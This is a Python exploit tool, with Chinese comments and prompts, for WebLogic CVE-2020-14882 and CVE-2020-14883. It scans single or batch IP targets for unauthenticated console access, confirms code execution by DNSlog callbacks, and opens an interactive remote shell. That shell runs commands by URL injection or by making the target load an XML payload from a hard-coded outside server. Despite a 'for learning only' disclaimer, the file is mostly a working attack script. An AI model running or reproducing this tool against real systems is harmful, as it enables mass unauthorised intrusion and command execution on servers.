from function import *
# POC1 URL中直接执行命令（12.2.1.*）
# POC2 外部XML实体注入 （10.3.6.0，12.1.3.0，12.2.1.3，12.2.1.4，14.1.1.0）
# -----------------------------------------------------------------------------
# 1.判断越权[读取respond包（返回状态200）]
#      1.5 读取版本信息----> <p id="footerVersion">WebLogic Server 版本: 12.2.1.3.0</p>
#    2.DNS出网验证RCE（DNSLOG）
#      3.  执行bash

print("\033[1;31m本脚本用于得WebLogic的CVE-2020-14882与14883漏洞进行验证利用仅供学习交流，请勿用于非法途径。\033[0m\nwritten by Maple.")
print("-------------------------------------------------------------")
rm_xml()
while True:
    type=input("请选择验证方式。\n[1]单个验证\n[2]批量验证\n>")
    if(type=='1'):
        ip = input("请输入扫描目标(ip+端口)\n>")
        v1 = '10.3.6.0'
        try:
            print("开始对ip" + ip + "进行未授权访问验证")
            cookie, version = weishouquan_panduan(ip)
            if (version == '0'):
                print(ip + ":该网址不存在未授权访问或不是weblogic控制台")
                continue
        except:
            print("参数获取有误，自动跳过")
            continue # 后面加个IF判断
        if (v1 in version):
            print("注意：当前版本只能加载远端XML文件利用")
            print("注意：正在加载远程xml进行CVE-2020-14883验证......")
            dns_cookie, dns_url = dnslog_cookie_get()
            rm_xml()
            upload_xml_bao("curl " + dns_url)
            remote_xml_bao(ip, cookie, "http://118.25.151.131/test/shdm/example/static/config1.xml")
            time.sleep(5)
            log = dns_check(dns_cookie)
            if (log == "[]"):
                print("出网验证失败，漏洞大概率无法利用。你手动测吧TAT")
                rm_xml()
            else:
                print("验证成功，漏洞存在。\n注意：为保证稳定性，远程XML命令执行速度较慢")
                print("\033[7;31m您已进入命令模式,遵纪守法从我做起!（输入 Quit/ 来退出）\033[0m")
                print(
                    "===========================================================================================================")
                while True:
                    rm_xml()
                    bash = input(">>")
                    upload_xml_bao(bash)
                    time.sleep(2.5)
                    remote_xml_bao(ip, cookie, "http://118.25.151.131/test/shdm/example/static/config1.xml")
                    time.sleep(4)
                    if (bash == "Quit/"):
                        rm_xml()
                        time.sleep(1)
                        break
            pass
        else:
            print("正在进行CVE-2020-14883漏洞验证")
            dns_cookie, dns_url = dnslog_cookie_get()
            url_rce_bao(ip, cookie, "curl%20" + dns_url)
            time.sleep(5)
            log = dns_check(dns_cookie)
            if (log == "[]"):
                print("出网验证失败，漏洞大概率不可利用。你手动测吧TAT")
            else:
                print("验证成功，漏洞存在。\n")
                print("\033[7;31m您已进入命令模式,遵纪守法从我做起!（输入 Quit/ 来返回）\033[0m")
                print("===========================================================================================================")
                while True:
                    shell_opt = input("请选择代码执行方式\n[1]在URL中提交（可能失败）\n[2]加载远程xml（速度缓慢）\n[3]退出\n>")
                    if (shell_opt == '1'):
                        while True:
                            cmd = input(">>")
                            bash = cmd.replace(" ", "%20")
                            url_rce_bao(ip, cookie, cmd)
                            print(">>>done!")
                            if (cmd == "Quit/"):
                                break
                        pass
                    elif (shell_opt == '2'):
                        print("\033[7;31m您已进入命令模式,遵纪守法从我做起!（输入 Quit/ 来返回）\033[0m")
                        print(
                            "===========================================================================================================")
                        while True:
                            rm_xml()
                            bash = input(">>")
                            upload_xml_bao(bash)
                            time.sleep(2.5)
                            remote_xml_bao(ip, cookie, "http://118.25.151.131/test/shdm/example/static/config1.xml")
                            print(">>>done!")
                            time.sleep(2)
                            if (bash == "Quit/"):
                                rm_xml()
                                time.sleep(1)
                                break
                    elif (shell_opt == '3'):
                        break
                    else:
                        print("请输入正确的内容")
                        continue
                pass
        pass
    elif(type=='2'):
        print("请将Ip字典放入ips.txt")
        wuyong=input('按任意键继续...')
        ips=[]
        try:
            ips=get_ips_from_file()
            print("ip列表获取完毕!")
            print('\033[1;32m----------------------------------------------------------------\033[0m')
        except:
            print("\033[1;31m请检查ip文档的格式是否正确（每行一个，注意是否2字节的字符）\033[0m")
        for ip_use in ips:
            ip=ip_use
            v1 = '10.3.6.0'
            print('\033[1;34m----------------------------------------------------------------\033[0m')
            try:
                print("开始对ip" + ip + "进行未授权访问验证")
                cookie, version = weishouquan_panduan(ip)
                if(version=='0'):
                    print(ip+":该网址不存在未授权访问或不是weblogic控制台")
                    continue
            except:
                print("参数获取有误，自动跳过")
                continue
            print("开始对ip"+ip+"进行命令执行验证")
            if (v1 in version):
                print("注意：当前版本只能加载远端XML文件利用")
                print("注意：正在加载远程xml进行CVE-2020-14883验证......")
                dns_cookie, dns_url = dnslog_cookie_get()
                rm_xml()
                upload_xml_bao("curl " + dns_url)
                remote_xml_bao(ip, cookie, "http://118.25.151.131/test/shdm/example/static/config1.xml")
                time.sleep(5)
                log = dns_check(dns_cookie)
                if (log == "[]"):
                    print("验证失败。")
                    # print('\033[1;34m----------------------------------------------------------------\033[0m')
                    rm_xml()
                    continue
                else:
                    success_log(ip)
                    print(ip+"\033[1;31m验证成功，漏洞存在。记录保存在success.txt中\033[0m")
                    # print('\033[1;34m----------------------------------------------------------------\033[0m')
                    continue
                pass
            else:
                print("正在进行CVE-2020-14883漏洞验证")
                dns_cookie, dns_url = dnslog_cookie_get()
                url_rce_bao(ip, cookie, "curl%20" + dns_url)
                time.sleep(5)
                log = dns_check(dns_cookie)
                if (log == "[]"):
                    print("验证失败，开始进行远程xml验证")
                    rm_xml()
                    upload_xml_bao("curl " + dns_url)
                    remote_xml_bao(ip, cookie, "http://118.25.151.131/test/shdm/example/static/config1.xml")
                    time.sleep(5)
                    log = dns_check(dns_cookie)
                    if (log == "[]"):
                        print("远程XML验证失败。")
                        # print('\033[1;34m----------------------------------------------------------------\033[0m')
                        rm_xml()
                        continue
                    else:
                        success_log(ip)
                        print(ip + "\033[1;31m验证成功，漏洞存在。记录保存在success.txt中\033[0m")
                        # print('\033[1;34m----------------------------------------------------------------\033[0m')
                        continue
                else:
                    success_log(ip)
                    print(ip+"\033[1;31m验证成功，漏洞存在。记录已经保存在success.txt\033[0m")
                    # print('\033[1;34m----------------------------------------------------------------\033[0m')
                    continue
    else:
        print("输入错误，请重新输入")
        continue

# ip=input("请输入扫描目标(ip+端口)\n>")
# v1='10.3.6.0'
# cookie,version=weishouquan_panduan(ip)  #后面加个IF判断
# if (v1 in version):
#     print("注意：当前版本只能加载远端XML文件利用")
#     print("注意：正在加载远程xml进行CVE-2020-14883验证......")
#     dns_cookie,dns_url=dnslog_cookie_get()
#     rm_xml()
#     upload_xml_bao("curl "+dns_url)
#     remote_xml_bao(ip,cookie,"http://118.25.151.131/test/shdm/example/static/config1.xml")
#     time.sleep(20)
#     log=dns_check(dns_cookie)
#     if (log=="[]"):
#         print("出网验证失败，漏洞大概率无法利用。你手动测吧TAT")
#         rm_xml()
#     else:
#         print("验证成功，漏洞存在。\n注意：为保证稳定性，远程XML命令执行速度较慢")
#         print("\033[7;31m您已进入命令模式,遵纪守法从我做起!（输入 Quit/ 来退出）\033[0m")
#         print("===========================================================================================================")
#         while True:
#             rm_xml()
#             bash=input(">>")
#             upload_xml_bao(bash)
#             time.sleep(2.5)
#             remote_xml_bao(ip,cookie,"http://118.25.151.131/test/shdm/example/static/config1.xml")
#             time.sleep(4)
#             if(bash=="Quit/"):
#                 rm_xml()
#                 time.sleep(1)
#                 break
#     pass
# else:
#     print("正在进行CVE-2020-14883漏洞验证")
#     dns_cookie,dns_url=dnslog_cookie_get()
#     url_rce_bao(ip,cookie,"curl%20"+dns_url)
#     time.sleep(20)
#     log=dns_check(dns_cookie)
#     if(log=="[]"):
#         print("出网验证失败，漏洞大概率不可利用。你手动测吧TAT")
#     else:
#         print("验证成功，漏洞存在。\n")
#         print("\033[7;31m您已进入命令模式,遵纪守法从我做起!（输入 Quit/ 来返回）\033[0m")
#         print("===========================================================================================================")
#         while True:
#             shell_opt=input("请选择代码执行方式\n[1]在URL中提交（可能失败）\n[2]加载远程xml（速度缓慢）\n[3]退出\n>")
#             if(shell_opt=='1'):
#                 while True:
#                     cmd=input(">>")
#                     bash=cmd.replace(" ","%20")
#                     url_rce_bao(ip,cookie,cmd)
#                     print(">>>done!")
#                     if (cmd=="Quit/"):
#                         break
#                 pass
#             elif(shell_opt=='2'):
#                 print("\033[7;31m您已进入命令模式,遵纪守法从我做起!（输入 Quit/ 来返回）\033[0m")
#                 print("===========================================================================================================")
#                 while True:
#                     rm_xml()
#                     bash = input(">>")
#                     upload_xml_bao(bash)
#                     time.sleep(2.5)
#                     remote_xml_bao(ip, cookie, "http://118.25.151.131/test/shdm/example/static/config1.xml")
#                     print(">>>done!")
#                     time.sleep(2)
#                     if (bash == "Quit/"):
#                         rm_xml()
#                         time.sleep(1)
#                         break
#             elif(shell_opt=='3'):
#                 break
#             else:
#                 print("请输入正确的内容")
#                 continue
#         pass
